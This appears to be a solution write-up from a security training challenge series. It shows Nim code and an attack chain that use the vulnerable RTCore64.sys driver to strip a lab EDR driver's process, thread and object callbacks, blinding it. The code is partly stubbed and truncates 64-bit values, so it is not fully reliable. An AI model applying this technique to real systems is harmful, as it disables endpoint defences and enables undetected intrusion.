---
title: "Solution 38: BYOVD — Remove Kernel Callbacks"
difficulty: hard
category: "BYOVD / Kernel Attacks"
---

[Back to Challenge]({{ '/challenges/38-byovd-remove-callbacks/' | relative_url }})

## Overview

Instead of killing the EDR agent (Challenge 37), this technique silently removes the kernel driver's callbacks from the kernel's notification arrays. The agent stays alive but never receives another event — it's completely blind without knowing it.

This is the approach used by [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) (`-process` and `-thread` flags) and [CheekyBlinder](https://github.com/BR-Matt/CheekyBlinder) (ObRegisterCallbacks removal).

## Solution (Callback Removal with RTCore64.sys)

```nim
# callback_remove.nim - remove EDR kernel callbacks via R/W driver
import winim/lean
import os, strutils

const
  RTCORE_DEVICE = r"\\.\RTCore64"
  RTCORE_MAP_PHYS = 0x80002048'u32
  RTCORE_UNMAP    = 0x8000204C'u32

  MAX_CALLBACKS = 64

type
  # RTCore64.sys R/W structs
  RtCoreRead {.packed.} = object
    pad1: array[8, byte]
    address: uint64
    pad2: uint32
    value: uint32

  RtCoreWrite {.packed.} = object
    pad1: array[8, byte]
    address: uint64
    pad2: uint32
    value: uint32

  # Kernel module info from NtQuerySystemInformation
  SystemModuleEntry = object
    section: pointer
    mappedBase: pointer
    imageBase: pointer
    imageSize: uint32
    flags: uint32
    loadOrderIndex: uint16
    initOrderIndex: uint16
    loadCount: uint16
    offsetToFileName: uint16
    fullPathName: array[256, char]

proc kernelRead64(hDevice: HANDLE, address: uint64): uint64 =
  var req: RtCoreRead
  req.address = address
  var bytesReturned: DWORD
  DeviceIoControl(hDevice, RTCORE_MAP_PHYS,
    &req, DWORD(sizeof(req)), &req, DWORD(sizeof(req)),
    &bytesReturned, nil)
  return cast[uint64](req.value)

proc kernelWrite64(hDevice: HANDLE, address: uint64, value: uint64) =
  var req: RtCoreWrite
  req.address = address
  req.value = cast[uint32](value)
  var bytesReturned: DWORD
  DeviceIoControl(hDevice, RTCORE_UNMAP,
    &req, DWORD(sizeof(req)), nil, 0,
    &bytesReturned, nil)

proc findKernelModule(name: string): (uint64, uint32) =
  # Use NtQuerySystemInformation(SystemModuleInformation)
  # to find the base address and size of a kernel module
  # Returns (baseAddress, imageSize)
  #
  # Simplified - real implementation parses the returned buffer
  discard
  return (0'u64, 0'u32)

proc getCallbackArrayAddress(kernelBase: uint64,
    symbolName: string): uint64 =
  # Resolve PspCreateProcessNotifyRoutine from ntoskrnl PDB
  # Real tools use:
  #   1. Download PDB from Microsoft symbol server
  #   2. Parse PDB for symbol offset
  #   3. Add offset to kernel base
  #
  # Or use hardcoded offsets per build number:
  #   Windows 10 21H2: ntoskrnl+0x______
  #   Windows 11 23H2: ntoskrnl+0x______
  discard
  return 0'u64

proc removeProcessCallbacks(hDevice: HANDLE,
    edrBase, edrSize: uint64): int =
  let kernelBase = findKernelModule("ntoskrnl.exe")[0]
  let callbackArray = getCallbackArrayAddress(kernelBase,
    "PspCreateProcessNotifyRoutine")

  var removed = 0
  for i in 0 ..< MAX_CALLBACKS:
    let slot = callbackArray + uint64(i * 8)
    let entry = kernelRead64(hDevice, slot)
    if entry == 0: continue

    # Callback entries are EX_CALLBACK_ROUTINE_BLOCK pointers
    # with the low 4 bits used as flags — mask them off
    let blockAddr = entry and not 0xF'u64

    # Read the Function pointer from the block
    let funcPtr = kernelRead64(hDevice, blockAddr + 8)

    # Check if the function pointer falls within the EDR driver
    if funcPtr >= edrBase and funcPtr < edrBase + edrSize:
      echo "[+] Found EDR callback at slot ", i,
           " -> 0x", funcPtr.toHex()

      # Zero the callback entry to remove it
      kernelWrite64(hDevice, slot, 0)
      inc removed
      echo "    [*] Removed!"

  return removed

proc removeThreadCallbacks(hDevice: HANDLE,
    edrBase, edrSize: uint64): int =
  # Same approach but targeting PspCreateThreadNotifyRoutine
  let kernelBase = findKernelModule("ntoskrnl.exe")[0]
  let callbackArray = getCallbackArrayAddress(kernelBase,
    "PspCreateThreadNotifyRoutine")

  var removed = 0
  for i in 0 ..< MAX_CALLBACKS:
    let slot = callbackArray + uint64(i * 8)
    let entry = kernelRead64(hDevice, slot)
    if entry == 0: continue

    let blockAddr = entry and not 0xF'u64
    let funcPtr = kernelRead64(hDevice, blockAddr + 8)

    if funcPtr >= edrBase and funcPtr < edrBase + edrSize:
      echo "[+] Found EDR thread callback at slot ", i
      kernelWrite64(hDevice, slot, 0)
      inc removed

  return removed

proc removeObCallbacks(hDevice: HANDLE,
    edrBase, edrSize: uint64): int =
  # ObRegisterCallbacks creates OB_CALLBACK_ENTRY nodes
  # linked in a doubly-linked list.
  #
  # To remove: find the entry where PreOperation or
  # PostOperation points into the EDR's module range,
  # then unlink it (Flink/Blink pointer surgery).
  #
  # CheekyBlinder enumerates via:
  #   1. Find ObTypeInitializer for *PsProcessType
  #   2. Walk CallbackList (LIST_ENTRY)
  #   3. Each node has PreOperation/PostOperation pointers
  #   4. Check if they point into the EDR module
  #   5. Unlink: prev.Flink = node.Flink; next.Blink = node.Blink
  echo "[*] ObCallback removal requires LIST_ENTRY surgery"
  echo "    See CheekyBlinder for reference implementation"
  return 0

when isMainModule:
  echo "[*] BYOVD Callback Removal Tool"
  echo "[*] Target: MostShittyEDR.sys"
  echo ""

  # Step 1: Find the EDR driver in kernel memory
  let (edrBase, edrSizeU32) = findKernelModule("MostShittyEDR.sys")
  let edrSize = uint64(edrSizeU32)
  if edrBase == 0:
    echo "[-] MostShittyEDR.sys not found in kernel modules"
    quit(1)
  echo "[+] MostShittyEDR.sys @ 0x", edrBase.toHex(),
       " (", edrSize, " bytes)"

  # Step 2: Open the vulnerable driver
  let hDevice = CreateFileA(RTCORE_DEVICE,
    GENERIC_READ or GENERIC_WRITE, 0, nil,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
  if hDevice == INVALID_HANDLE_VALUE:
    echo "[-] Cannot open RTCore64 device"
    quit(1)
  defer: CloseHandle(hDevice)

  # Step 3: Remove all callback types
  let procRemoved = removeProcessCallbacks(hDevice, edrBase, edrSize)
  let threadRemoved = removeThreadCallbacks(hDevice, edrBase, edrSize)
  let obRemoved = removeObCallbacks(hDevice, edrBase, edrSize)

  echo ""
  echo "[+] Results:"
  echo "    Process callbacks removed: ", procRemoved
  echo "    Thread callbacks removed:  ", threadRemoved
  echo "    ObCallbacks removed:       ", obRemoved
  echo ""
  echo "[+] EDR driver is now deaf - agent receives no events"
```

## Why It Works

The MostShittyEDR kernel driver registers its callbacks via standard kernel APIs. These callbacks are stored in kernel arrays that any code with kernel R/W access can modify:

1. **`PspCreateProcessNotifyRoutine`**: Array of 64 `EX_CALLBACK_ROUTINE_BLOCK` pointers. Zeroing an entry removes the callback — the kernel simply skips `NULL` slots.

2. **`PspCreateThreadNotifyRoutine`**: Same structure and technique.

3. **`ObRegisterCallbacks`**: Creates `OB_CALLBACK_ENTRY` nodes in a doubly-linked list off `ObjectType->CallbackList`. Unlinking a node (pointer surgery on Flink/Blink) removes the callback.

The driver has **no integrity monitoring** — it never checks whether its callbacks are still registered. The agent continues polling `IOCTL_WAIT_FOR_EVENT`, but no events ever arrive because the kernel no longer invokes the callbacks.

## Attack Chain

```
1. Load vulnerable R/W driver (RTCore64.sys, GDRV.sys, DBUtil_2_3.sys)
2. Find ntoskrnl.exe base via NtQuerySystemInformation
3. Resolve PspCreateProcessNotifyRoutine offset (PDB or hardcoded)
4. Find MostShittyEDR.sys base+size in kernel module list
5. Walk the callback array, find entries pointing into EDR range
6. Zero them out via the R/W driver
7. Repeat for PspCreateThreadNotifyRoutine and ObCallbackList
8. EDR agent is blind — operate freely
```

## Real-World Countermeasures

Production EDRs defend against callback removal with:
- **PatchGuard (KPP)**: Periodically verifies callback arrays haven't been tampered with — causes BSOD if tampering detected
- **Kernel Data Protection (KDP)**: Marks callback arrays as read-only at the hypervisor level (VBS-protected)
- **Self-verification**: The driver periodically re-checks its callbacks are still registered and re-registers if removed
- **HVCI Driver Blocklist**: Blocks known R/W drivers from loading
- **Minifilter-based monitoring**: Detects the loading of known-vulnerable `.sys` files

## How to Verify

1. Start the EDR in driver mode: `.\edr_agent.exe --driver --verbose`
2. Verify events flow: launch `notepad.exe` — the agent should show `[CREATE]`
3. Run the callback removal tool
4. Launch `notepad.exe` again — the agent shows nothing (deaf)
5. The agent is still running (`tasklist`) but receives no events
6. Even `mimikatz.exe` can run without detection in this state
